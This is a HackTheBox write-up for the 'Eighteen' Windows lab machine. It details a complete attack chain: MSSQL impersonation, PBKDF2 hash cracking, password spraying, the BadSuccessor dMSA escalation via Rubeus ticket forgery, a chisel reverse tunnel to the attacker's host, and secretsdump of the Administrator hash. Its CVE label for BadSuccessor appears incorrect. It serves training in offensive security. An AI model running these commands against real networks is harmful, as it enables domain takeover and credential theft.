---
title: "HTB-Eighteen-Easy"
date: "2025-11-21"
platform: "HackTheBox"
category: "Windows"
difficulty: "Easy"
tags: ["MSSQL","Impersonation","PBKDF2 Cracking","Password Spraying","WinRM","Active Directory","BadSuccessor","Privilege Escalation","Kerberos","Ticket Forgery","CVE-2025-21293","Domain PrivEsc"]
excerpt: "A full Active Directory compromise starting from MSSQL impersonation, cracking PBKDF2 hashes, password spraying to obtain WinRM access, and leveraging the BadSuccessor AD vulnerability (CVE-2025-21293) to escalate to Domain Admin."
readingTime: 20
featured: true
---
## Overview

Eighteen is a Windows Active Directory machine that involves MSSQL exploitation, password spraying, and abusing the BadSuccessor vulnerability (CVE-2025-21293) to escalate from a domain user to Domain Admin.

**Attack Chain Summary:**

1. Initial access via MSSQL with provided credentials
2. Impersonate `appdev` user to access `financial_planner` database
3. Extract and crack admin password hash
4. Password spray to find valid domain user credentials
5. WinRM access as `adam.scott`
6. Exploit BadSuccessor vulnerability to get Domain Admin

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sCV -p- 10.10.11.95
```

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: EIGHTEEN
|   NetBIOS_Domain_Name: EIGHTEEN
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: eighteen.htb
|   DNS_Computer_Name: DC01.eighteen.htb
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Key findings:**

- Web server on port 80 (redirects to `eighteen.htb`)
- MSSQL Server 2022 on port 1433
- WinRM on port 5985
- Domain: `eighteen.htb`
- DC hostname: `DC01.eighteen.htb`

Add to `/etc/hosts`:

```bash
echo "10.10.11.95 eighteen.htb DC01.eighteen.htb" | sudo tee -a /etc/hosts
```

### Initial Credentials

We are provided with initial credentials:

```
kevin : iNa2we6haRj2gaw!
```

---

## User Flag

### Step 1: MSSQL Enumeration

The web application requires admin credentials we don't have yet. Let's explore MSSQL instead.

```bash
impacket-mssqlclient eighteen.htb/kevin:'iNa2we6haRj2gaw!'@10.10.11.95
```

Once connected, check for impersonation privileges:

```sql
SQL> enum_impersonate
```

![image](1.png)


This reveals that `kevin` can impersonate the `appdev` login.

### Step 2: Impersonate appdev and Extract Data

```sql
SQL> exec_as_login appdev
SQL> SELECT name FROM sys.databases;
SQL> USE financial_planner;
SQL> SELECT * FROM users;
```

![image](2.png)

We find a Flask/Werkzeug PBKDF2-SHA256 hash for the admin user:

```
pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
```

### Step 3: Crack the Hash

Standard tools like hashcat/john are slow for PBKDF2 with 600,000 iterations. Use Python with Werkzeug directly:

```python
from werkzeug.security import check_password_hash

hashes = {
    'admin': 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133',
    'cees': 'pbkdf2:sha256:600000$IP6EfOPo5lPUCsbO$09df440eff7eff90aae681d5264b79ec09f7d31cf1e6edb72a57709e71bb4018'
}

with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
    for line in f:
        password = line.strip()
        for user, hash_value in list(hashes.items()):
            if check_password_hash(hash_value, password):
                print(f"[+] Found password for {user}: {password}")
                del hashes[user]
                break
        if not hashes:
            break
```

**Result:** `iloveyou1`

### Step 4: Enumerate Domain Users

Use RID brute-forcing to find domain users:

```bash
nxc mssql DC01.eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
```

![image](3.png)

**Users found:**

- jamie.dunn
- jane.smith
- alice.jones
- adam.scott
- bob.brown
- carol.white
- dave.green

### Step 5: Password Spraying

Create a users file and spray the cracked password:

```bash
nxc winrm DC01.eighteen.htb -u users.txt -p 'iloveyou1'
```

**Result:** `adam.scott : iloveyou1` has WinRM access!

### Step 6: Get User Flag

```bash
evil-winrm -i DC01.eighteen.htb -u adam.scott -p 'iloveyou1'
```

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
[USER FLAG HERE]
```

---

## Root Flag

### Understanding BadSuccessor (CVE-2025-21293)

**What is BadSuccessor?**

BadSuccessor is a critical Active Directory vulnerability that allows any user with `CreateChild` permissions on an Organizational Unit (OU) to escalate to Domain Admin. It exploits weaknesses in how Active Directory handles **delegated Managed Service Accounts (dMSAs)**.

**How does it work?**

1. **dMSA Basics**: Delegated Managed Service Accounts are a feature in Windows Server 2025 that allows service accounts to "migrate" from a predecessor account, inheriting its credentials.
    
2. **The Vulnerability**: When a dMSA is configured with a predecessor (like Administrator), the system trusts that relationship without proper validation. Any account that can create objects in an OU can:
    
    - Create a machine account
    - Create a dMSA linked to that machine account
    - Set the dMSA's predecessor to Administrator
    - Request Kerberos tickets that inherit Administrator's privileges
3. **Why it's dangerous**: This effectively bypasses all normal privilege escalation protections because the dMSA mechanism was designed to trust the predecessor relationship.
    

### Step 1: Check for BadSuccessor Vulnerability

First, upload the required tools to the target:

- `Invoke-BadSuccessor.ps1` -[Invoke-BadSuccessor](https://github.com/b5null/Invoke-BadSuccessor.ps1)
- `Rubeus.exe`
- `Get-BadSuccessorOUPermissions.ps1`

Check which OUs are vulnerable:

```powershell
. .\Get-BadSuccessorOUPermissions.ps1
Get-BadSuccessorOUPermissions
```

```
Identity      OUs
--------      ---
EIGHTEEN\IT   {OU=Staff,DC=eighteen,DC=htb}
```

This shows the **IT group** has permissions on the **Staff OU**. Since `adam.scott` is a member of IT, we can exploit this!

### Step 2: Execute BadSuccessor Attack

```powershell
. .\Invoke-BadSuccessor.ps1
Invoke-BadSuccessor
```

```
[+] Created computer 'Pwn' in 'OU=Staff,DC=eighteen,DC=htb'.
[+] Machine Account's sAMAccountName : Pwn$
[+] Machine Account's SID             : S-1-5-21-1152179935-589108180-1989892463-12110

[+] Created delegated service account 'attacker_dMSA' in 'OU=Staff,DC=eighteen,DC=htb'.
[+] Service Account's sAMAccountName : attacker_dMSA$
[+] Allowed to retrieve password      : Pwn$

[+] Configured delegated MSA state for 'attacker_dMSA$' with predecessor:
    CN=Administrator,CN=Users,DC=eighteen,DC=htb
```

**What happened:**

1. Created a computer account `Pwn$` with password `Password123!`
2. Created a dMSA `attacker_dMSA$` linked to `Pwn$`
3. Set Administrator as the predecessor, giving `attacker_dMSA$` Administrator privileges

### Step 3: Get Kerberos Tickets

**Calculate the AES256 hash for Pwn$:**

```powershell
.\Rubeus.exe hash /password:'Password123!' /user:Pwn$ /domain:eighteen.htb
```

```
[*] aes256_cts_hmac_sha1 : 07CE45274C9D70F6C47ACD9D72838A4D292903CBC8947E2C32B7F9E0ECF17D0B
```

**Request TGT for Pwn$:**

```powershell
.\Rubeus.exe asktgt /user:Pwn$ /aes256:07CE45274C9D70F6C47ACD9D72838A4D292903CBC8947E2C32B7F9E0ECF17D0B /domain:eighteen.htb /opsec /outfile:tgt.kirbi
```

**Request dMSA ticket (inherits Administrator privileges):**

```powershell
.\Rubeus.exe asktgs /ticket:tgt.kirbi /targetuser:attacker_dMSA$ /service:krbtgt/eighteen.htb /dmsa /opsec /ptt /nowrap /outfile:atk.kirbi
```

⚠️ **IMPORTANT**: The dMSA ticket has a **15-minute lifetime**! Execute the next step immediately.

**Request CIFS service ticket:**

```powershell
.\Rubeus.exe asktgs /ticket:atk.kirbi /service:cifs/dc01.eighteen.htb /ptt /outfile:cifs.kirbi
```

### Step 4: Download and Convert Ticket

```powershell
download cifs.kirbi
```

On Kali, convert the kirbi to ccache format:

```bash
impacket-ticketConverter cifs.kirbi cifs.ccache
export KRB5CCNAME=$(pwd)/cifs.ccache
klist
```

Verify the ticket:

```
Ticket cache: FILE:cifs.ccache
Default principal: attacker_dMSA$@eighteen.htb

Service principal: cifs/dc01.eighteen.htb@EIGHTEEN.HTB
```

### Step 5: Dump Administrator Hash

Set up a SOCKS proxy via chisel (on target):

```powershell
.\chisel.exe client YOUR_IP:8082 R:socks
```

On Kali (start chisel server first):

```bash
chisel server -p 8082 --reverse
```

Now dump the Administrator hash:

```bash
proxychains4 secretsdump.py -k -no-pass -just-dc-user administrator -dc-ip 10.10.11.95 -target-ip 10.10.11.95 dc01.eighteen.htb
```

### Step 6: Get Root Flag

Use the Administrator hash to get a shell:

```bash
evil-winrm -i DC01.eighteen.htb -u administrator -H <NTLM_HASH>
```

Or use the Kerberos ticket:

```bash
proxychains4 psexec.py -k -no-pass administrator@dc01.eighteen.htb
```

```powershell
C:\Windows\System32> type C:\Users\Administrator\Desktop\root.txt
[ROOT FLAG HERE]
```
